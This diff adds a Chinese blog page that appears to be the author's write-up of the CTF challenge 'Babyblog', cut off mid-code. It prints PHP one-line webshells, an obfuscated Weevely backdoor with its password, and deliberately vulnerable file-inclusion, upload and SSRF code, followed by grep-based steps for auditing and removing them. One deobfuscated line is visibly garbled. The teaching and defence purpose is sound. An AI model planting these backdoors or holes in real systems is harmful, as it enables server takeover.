@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>XMan2017夏令营结业攻防赛Babyblog出题思路 &amp; WriteUP | 0xe799bde88f9c</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="出题人WP！总之就是很水了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XMan2017夏令营结业攻防赛Babyblog出题思路 &amp; WriteUP">
+<meta property="og:url" content="https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/index.html">
+<meta property="og:site_name" content="0xe799bde88f9c">
+<meta property="og:description" content="出题人WP！总之就是很水了。">
+<meta property="og:locale">
+<meta property="article:published_time" content="2017-08-20T07:21:31.000Z">
+<meta property="article:modified_time" content="2021-03-12T09:32:07.303Z">
+<meta property="article:author" content="Yibai Zhang">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="0xe799bde88f9c" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">0xe799bde88f9c</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.summershrimp.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-xman2017-awd-babyblog-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/08/xman2017-awd-babyblog-writeup/" class="article-date">
+  <time datetime="2017-08-20T07:21:31.000Z" itemprop="datePublished">2017-08-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XMan2017夏令营结业攻防赛Babyblog出题思路 &amp; WriteUP
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>出题人WP！总之就是很水了。</p>
+<a id="more"></a>
+
+<h2 id="0x00-出题思路"><a href="#0x00-出题思路" class="headerlink" title="0x00 出题思路"></a>0x00 出题思路</h2><h3 id="常见一句话木马"><a href="#常见一句话木马" class="headerlink" title="常见一句话木马"></a>常见一句话木马</h3><p>一句话木马是在日常攻击和渗透中使用的最广泛的一类木马，其具有代码量小，变形多，易隐藏等特性。这类一句话木马多为通过eval或类似命令直接执行对应语言的字符串代码，达到可以执行任意命令的效果。在本题中，我一共放置了四种不同类型的一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. app/template/*.tpl</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[passwd])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. app/controllers/PostsController.php </span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="function"><span class="keyword">function</span>](<span class="params"><span class="variable">$_POST</span>[params]</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 3. <span class="title">bootstrap</span>/<span class="title">autoload</span>.<span class="title">php</span></span></span><br><span class="line">echo `$_POST[shellcmd]`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. app/views/errors/404.blade.php</span></span><br><span class="line">@preg_replace(<span class="string">&quot;/[pageerror]/e&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>], <span class="string">&quot;saft&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见大马"><a href="#常见大马" class="headerlink" title="常见大马"></a>常见大马</h3><p>相比于小马，这类木马通常体积稍大，更不易隐藏。但其中可以包含更多加密和混淆的措施，使攻击行为更不容易被察觉。在本题中，我放置了一个Weevely木马，其密码为xman1234</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. autoload_real.php</span></span><br><span class="line"><span class="variable">$i</span>=<span class="string">&#x27;er&quot;;$K3i=$m[1][0K3].K3$m[1K3]K3[1];$hK3=$K3sl($ss(K3md5($i.$kh),0,K33));$f=$sl(K3$sK3s(md5($i.$&#x27;</span>;</span><br><span class="line"><span class="variable">$D</span>=<span class="string">&#x27;kfK3K3),0,3));$p=&quot;K3&quot;;foK3K3r(K3$K3z=1;$z&lt;count($m[1]);K3$z++)$pK3.=$q[$m[K32K3][K3K3$z]];if(sK&#x27;</span>;</span><br><span class="line"><span class="variable">$v</span>=<span class="string">&#x27;3LANK3GUAK3GE&quot;];if($rr&amp;&amp;$ra)K3&#123;$u=paK3rK3K3sK3K3e_url($rr);parse_str($uK3[&quot;query&quot;],$qK3);$q=arK&#x27;</span>;</span><br><span class="line"><span class="variable">$B</span>=<span class="string">&#x27;[$i].=$p;$eK3=strpK3oK3s($s[$i]K3,$f);ifK3($eK3)&#123;$k=$khK3.K3$kf;oK3b_start();@evaK3l(@gzuncK3om&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span>=<span class="string">&#x27;3;&#125;&#125;return K3$oK3;&#125;$rK3=$_K3SERVER;$K3rr=@$r[K3&quot;HTTP_REFEREK3R&quot;];$ra=K3@$r[&quot;K3HTTP_AK3CCK3EPT_K&#x27;</span>;</span><br><span class="line"><span class="variable">$O</span>=<span class="string">&#x27;K3;iK3f($q&amp;K3&amp;$m)&#123;@sesK3sioK3n_start()K3;$s=K3&amp;$_SK3ESSIK3OK3N;$ss=&quot;substK3r&quot;;$sK3l=&quot;strtK3olow&#x27;</span>;</span><br><span class="line"><span class="variable">$H</span>=<span class="string">&#x27;3=&quot;&quot;;for($i=0;$i&lt;$l;K3)&#123;fK3orK3($j=0;($j&lt;$K3c&amp;&amp;$i&lt;$K3lK3)K3;$j++K3,$i++)&#123;$o.=$tK3&#123;$i&#125;^$k&#123;$K3j&#125;K&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;$K3ss($s[$i],0K3,$eK3))),$k))K3);$K3o=oK3b_get_conK3tentsK3();ob_enK3d_cK3lean();K3K3$d=baseK36&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span>=<span class="string">&#x27;4_encode(x(K3gzcompK3ress($oK3),$kK3));print(&quot;&lt;K3$k&gt;$dK3K3&lt;/$k&gt;&quot;K3);@sK3ession_deK3stroy();&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&#x27;$kh=&quot;a8bK3b&quot;;$K3kf=&quot;c44K3K3a&quot;;funK3ctK3ion x($t,$k)&#123;$cK3=sK3trlen($kK3);$l=stK3rlK3en($t);K3$oK&#x27;</span>;</span><br><span class="line"><span class="variable">$M</span>=<span class="string">&#x27;prK3ess(@x(@bK3aK3se64K3_decodeK3(pregK3_replaK3ce(aK3rray(&quot;/_/&quot;,K3&quot;/-/&quot;),arrK3ay(K3&quot;/&quot;,&quot;K3+&quot;),&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="string">&#x27;3trposK3($p,$h)===0K3)&#123;$s[$i]=&quot;&quot;K3;$p=$sK3s($pK3,3);&#125;K3K3if(array_key_exisK3ts($i,K3$K3sK3))&#123;$s&#x27;</span>;</span><br><span class="line"><span class="variable">$Q</span>=str_replace(<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crdddeatde_fdunctdion&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;3raK3y_vK3alues(K3$q)K3;preg_mK3aK3tch_all(&quot;K3/(K3[\\K3w])[\\w-]+(?:;q=0.([\\d]))K3?,K3?/&quot;,$ra,$m)&#x27;</span>;</span><br><span class="line"><span class="variable">$l</span>=str_replace(<span class="string">&#x27;K3&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$t</span>.<span class="variable">$H</span>.<span class="variable">$o</span>.<span class="variable">$v</span>.<span class="variable">$b</span>.<span class="variable">$O</span>.<span class="variable">$i</span>.<span class="variable">$D</span>.<span class="variable">$f</span>.<span class="variable">$B</span>.<span class="variable">$M</span>.<span class="variable">$c</span>.<span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$q</span>=<span class="variable">$Q</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$l</span>);<span class="variable">$q</span>();</span><br></pre></td></tr></table></figure>
+
+<p>在这段大马中，<code>$Q</code>和<code>$l</code>均为字符串。Weevely借助PHP可以将函数名字符串用作类似函数指针的特性，来构造木马。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Q</span> = create_function</span><br><span class="line"></span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;a8bb&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;c44a&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">	<span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">	<span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;(<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>);<span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">			<span class="variable">$o</span>.= <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$rr</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rr</span> &amp;&amp; <span class="variable">$ra</span>) &#123;</span><br><span class="line">	<span class="variable">$u</span> = parse_url(<span class="variable">$rr</span>);</span><br><span class="line">	parse_str(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>], <span class="variable">$q</span>);</span><br><span class="line">	<span class="variable">$q</span> = array_values(<span class="variable">$q</span>);</span><br><span class="line">	preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="variable">$ra</span>, <span class="variable">$m</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$q</span> &amp;&amp; <span class="variable">$m</span>) &#123;</span><br><span class="line">		@session_start();</span><br><span class="line">		<span class="variable">$s</span> = &amp; <span class="variable">$_SESSION</span>;</span><br><span class="line">		<span class="variable">$ss</span> = <span class="string">&quot;substr&quot;</span>;</span><br><span class="line">		<span class="variable">$sl</span> = <span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">		<span class="variable">$i</span> = <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>] . <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">		<span class="variable">$h</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span> . <span class="variable">$kh</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">		<span class="variable">$f</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span> . <span class="variable">$kf</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">		<span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">1</span>;$z<span class="variable">$d</span><span class="string">&quot;);@session_destroy();&#125;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a>任意文件包含</h3><p>任意文件包含多为服务端程序在开发时没对可包含目录和文件做限制，导致可以读取任何文件。一般的表现形式为<code>http://localhost/page=index</code>或类似方式。本题中，我们在博客文章中引入了正文模板，这里的模板就具有文件包含漏洞。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. app/views/posts/show.blade.php</span></span><br><span class="line">&lt;div class=&quot;article-body&quot;&gt;;</span><br><span class="line">    &#123;&#123; <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&quot;/../../template/&quot;</span>.<span class="variable">$post</span>-&gt;template &#125;&#125;</span><br><span class="line">    &#123;&#123; <span class="variable">$post</span>-&gt;body &#125;&#125;</span><br><span class="line">&lt;/div&gt;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p>任意文件上传多为服务端程序在开发时，未对可上传文件的扩展名进行限制，导致可以上传服务器脚本，并通过HTTP访问执行。本题中，我们在博客文章图片上传处未对可上传文件做限制。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. app/controllers/PostsController.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uploadImage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = [</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;Failed!&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;file_path&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> = Input::file(<span class="string">&#x27;upload_file&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$fileName</span>        = <span class="variable">$file</span>-&gt;getClientOriginalName();</span><br><span class="line">            <span class="variable">$extension</span>       = <span class="variable">$file</span>-&gt;getClientOriginalExtension() ?: <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="variable">$folderName</span>      = <span class="string">&#x27;/uploads/images/&#x27;</span> . date(<span class="string">&quot;Ym&quot;</span>, time()) .<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;d&quot;</span>, time()) .<span class="string">&#x27;/&#x27;</span>. Auth::user()-&gt;id;</span><br><span class="line">            <span class="variable">$destinationPath</span> = public_path() . <span class="variable">$folderName</span>;</span><br><span class="line">            <span class="variable">$safeName</span>        = str_random(<span class="number">10</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">            <span class="variable">$file</span>-&gt;move(<span class="variable">$destinationPath</span>, <span class="variable">$safeName</span>);</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;file_path&#x27;</span>] = <span class="variable">$folderName</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$safeName</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Succeeded!&quot;</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="服务端请求伪造"><a href="#服务端请求伪造" class="headerlink" title="服务端请求伪造"></a>服务端请求伪造</h3><p>服务端请求伪造是指在开发过程中，有些用户提交的资源（如图片，文字等）需要加载到服务器本地进行处理，但服务端并未对资源地址进行限制，导致的可以探测服务器内网或任意本地文件读取。本题中，我们设计了/resolve_image这个调用，但是并没有制作相应的前端页面。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. app/controllers/PostsController.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveImage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$resp</span> = [</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;Failed!&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;file_path&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = Input::only(<span class="string">&#x27;resolve_file&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$content</span> = @file_get_contents(<span class="variable">$data</span>[<span class="string">&#x27;resolve_file&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$content</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$extension</span>       = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="variable">$folderName</span>      = <span class="string">&#x27;/uploads/images/&#x27;</span> . date(<span class="string">&quot;Ym&quot;</span>, time()) .<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;d&quot;</span>, time()) .<span class="string">&#x27;/&#x27;</span>. Auth::user()-&gt;id;</span><br><span class="line">            <span class="variable">$destinationPath</span> = public_path() . <span class="variable">$folderName</span>;</span><br><span class="line">            <span class="variable">$safeName</span>        = str_random(<span class="number">10</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">            @mkdir(<span class="variable">$destinationPath</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            @file_put_contents(<span class="variable">$destinationPath</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$safeName</span>, <span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;file_path&#x27;</span>] = <span class="variable">$folderName</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$safeName</span>;</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Succeeded!&quot;</span>;</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x01-审计与防御方式"><a href="#0x01-审计与防御方式" class="headerlink" title="0x01 审计与防御方式"></a>0x01 审计与防御方式</h2><h3 id="常见一句话木马-1"><a href="#常见一句话木马-1" class="headerlink" title="常见一句话木马"></a>常见一句话木马</h3><p>可以通过grep或find等命令搜索相关关键字（如<code>eval, system, passthru, $_POST, $_REQUEST</code>）等，来快速定位相关位置，随后对源码进行审查。这类木马通常不会影响程序运行逻辑，因此可以直接删除相关代码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> grep -re <span class="built_in">eval</span></span></span><br><span class="line">vendor/d11wtq/boris/lib/Boris/EvalWorker.php:        $__result = eval($__input);</span><br><span class="line">vendor/d11wtq/boris/lib/Boris/EvalWorker.php:        eval($__hook);</span><br><span class="line">app/template/3.tpl:    echo isset($_POST[&quot;template&quot;]) ? eval($_POST[&quot;template&quot;]): &quot;&quot;;</span><br><span class="line">app/template/1.tpl:    echo isset($_POST[&quot;template&quot;]) ? eval($_POST[&quot;template&quot;]): &quot;&quot;;</span><br><span class="line">app/template/2.tpl:    echo isset($_POST[&quot;template&quot;]) ? eval($_POST[&quot;template&quot;]): &quot;&quot;;</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">grep -re \<span class="variable">$_POST</span></span></span><br><span class="line">bootstrap/compiled.php:        $request = self::createRequestFromFactory($_GET, $_POST, array(), $_COOKIE, $_FILES, $_SERVER);</span><br><span class="line">bootstrap/compiled.php:        $_POST = $this-&gt;request-&gt;all();</span><br><span class="line">bootstrap/compiled.php:        $request = array(&#x27;g&#x27; =&gt; $_GET, &#x27;p&#x27; =&gt; $_POST, &#x27;c&#x27; =&gt; $_COOKIE);</span><br><span class="line">bootstrap/autoload.php:echo `$_POST[checker]`;</span><br><span class="line">public/packages/frozennode/administrator/js/ckeditor/samples/assets/posteddata.php:if (!empty($_POST))</span><br><span class="line">...</span><br><span class="line">app/views/errors/404.blade.php:@preg_replace(&quot;/[pageerror]/e&quot;, $_POST[&#x27;notfound&#x27;], &quot;saft&quot;);</span><br><span class="line">app/storage/views/dde1e00e577ea930001955e78ec38ca4:@preg_replace(&quot;/[pageerror]/e&quot;, $_POST[&#x27;notfound&#x27;], &quot;saft&quot;);</span><br><span class="line">app/template/3.tpl:    echo isset($_POST[&quot;template&quot;]) ? eval($_POST[&quot;template&quot;]): &quot;&quot;;</span><br><span class="line">app/template/1.tpl:    echo isset($_POST[&quot;template&quot;]) ? eval($_POST[&quot;template&quot;]): &quot;&quot;;</span><br><span class="line">app/template/2.tpl:    echo isset($_POST[&quot;template&quot;]) ? eval($_POST[&quot;template&quot;]): &quot;&quot;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见大马-1"><a href="#常见大马-1" class="headerlink" title="常见大马"></a>常见大马</h3><p>基本方法同小马，但由于大马结构复杂，更加需要平时的积累和人工分析能力。这类木马通常不会影响程序运行逻辑，因此可以直接删除相关代码或文件。</p>
+<h3 id="任意文件包含-1"><a href="#任意文件包含-1" class="headerlink" title="任意文件包含"></a>任意文件包含</h3><p>可以通过grep或find等命令搜索相关关键字（如<code>include, require</code>）等，来快速定位相关位置，随后对源码进行审查。但因为这类关键词几乎在所有的代码文件中都存在，审查难度相对较大。但由于任意文件包含一般出现在业务逻辑内，与常用库的包含方式有所区别，有能力的团队可以开发一些审计工具，对其特征进行审计，也可以从业务逻辑入手对相关代码进行审计。由于这类问题会影响程序运行逻辑，因此需要选手理解题意，根据题目的业务逻辑修复代码或添加防御措施。</p>
+<p>在本题中，容易发现系统自带的三个模板均以<code>[0-9]\.tpl</code>命名，因此在相关业务逻辑中，对提交的模板名称进行过滤即可。具体的位置如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. app/controllers/PostsController.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">store</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$validator</span> = Validator::make(Input::all(), Post::<span class="variable">$rules</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$validator</span>-&gt;fails())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> Redirect::back()-&gt;withErrors(<span class="variable">$validator</span>)-&gt;withInput();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data</span> = Input::only(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;body&#x27;</span>, <span class="string">&#x27;category_id&#x27;</span>, <span class="string">&#x27;template&#x27;</span>);</span><br><span class="line">    <span class="variable">$data</span>[<span class="string">&#x27;user_id&#x27;</span>] = Auth::user()-&gt;id;</span><br><span class="line">    <span class="variable">$data</span>[<span class="string">&#x27;body&#x27;</span>] = Purifier::clean(<span class="variable">$data</span>[<span class="string">&#x27;body&#x27;</span>], <span class="string">&#x27;ugc_body&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$post</span> = Post::create(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$post</span>-&gt;tag(Input::get(<span class="string">&#x27;tags&#x27;</span>));</span><br><span class="line">    </span><br><span class="line">    Flash::success(lang(<span class="string">&#x27;Operation succeeded.&#x27;</span>));</span><br><span class="line">    <span class="keyword">return</span> Redirect::route(<span class="string">&#x27;posts.show&#x27;</span>, <span class="variable">$post</span>-&gt;id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 2. app/controllers/PostsController.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span 